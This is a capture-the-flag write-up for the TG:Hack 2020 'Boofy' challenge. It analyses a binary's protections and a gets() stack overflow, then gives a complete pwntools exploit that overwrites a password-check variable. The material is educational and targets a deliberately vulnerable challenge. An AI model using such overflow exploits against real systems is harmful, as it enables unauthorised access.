---
layout: post
title: TG:Hack CTF 2020 - Boofy 
---

> This program looks like it's password protected, but we can't seem to find the correct password.
>
> nc boofy.tghack.no 6003
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
boofy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=3d900c837e32043007c852a8c880bbb3c6d762eb, with debug_info, not stripped

Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
{% endhighlight %}

Decompiling binary shows obvious stack overflow vulnerability by using function `gets`.

![decompiled_try_password][decompiled_try_password]

We can see that buffer that we are reading to has 20 bytes, and then there is variable `correct` right after it set to `0`. We need to overflow buffer and override value of `correct` to `1`.

We can do it by sending following payload:

{% highlight python %}
payload = (
    b"A" * 20 +
    b"\x01"
)
io.sendline(payload)
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./boofy')

host = args.HOST or 'boofy.tghack.no'
port = int(args.PORT or 6003)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil("Please enter the password?\n")

payload = (
    b"A" * 20 +
    b"\x01"
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/tghack/boofy
[decompiled_try_password]: {{site.baseurl}}/ctf/2020-04-14-tghack-boofy/decompiled_try_password.png
